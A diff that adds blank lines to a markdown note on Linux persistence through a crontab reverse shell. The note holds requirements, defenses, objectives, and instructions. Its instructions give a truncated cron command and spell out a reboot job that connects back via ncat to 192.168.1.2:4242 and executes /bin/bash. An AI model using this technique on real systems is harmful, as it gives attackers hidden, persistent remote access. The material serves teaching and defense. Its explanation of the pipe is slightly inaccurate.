@@ -37,11 +37,15 @@ The attacker gains access to the system by exploiting a vulnerability or using a
 
 This technique can be used to maintain access to a compromised system, even if the initial point of entry is discovered and patched. It can also be used to establish a foothold within a network and move laterally to other systems.
 
+ 
+
 ## Requirements
 
 1. Access to a compromised Linux system
 
 1. Knowledge of crontab and reverse shell techniques
+
+ 
 
 ## Defense
 
@@ -50,6 +54,8 @@ This technique can be used to maintain access to a compromised system, even if t
 1. Implement network segmentation to limit lateral movement
 
 1. Use firewalls and intrusion detection/prevention systems to detect and block reverse shell connections
+
+ 
 
 ## Objectives
 
@@ -61,11 +67,19 @@ This technique can be used to maintain access to a compromised system, even if t
 
 1. Move laterally within the network
 
+ 
+
 # Instructions
 
 1. This command adds a new cron job to the crontab file that will run on every reboot. The command will sleep for 200 seconds and then connect back to the server at IP address 192.168.1.2 on port 4242 using ncat and execute /bin/bash.
 
+ 
+
+
+
 **Code**: [[(crontab -l ; echo "@reboot sleep 200 && ncat 192.]]
+
+
 
 > The command is composed of two parts separated by a semicolon. The first part retrieves the current crontab file using the 'crontab -l' command. The output of this command is then piped to the 'echo' command which appends a new cron job to the existing file. The new cron job is set to run on every reboot using the '@reboot' keyword. The job will sleep for 200 seconds using the 'sleep' command and then connect back to the server at IP address 192.168.1.2 on port 4242 using 'ncat' and execute '/bin/bash' using the '-e' option.
 
@@ -91,3 +105,5 @@ This technique can be used to maintain access to a compromised system, even if t
 
 - [[Crontab - Reverse shell]]
 - [[Linux - Persistence]]
+
+
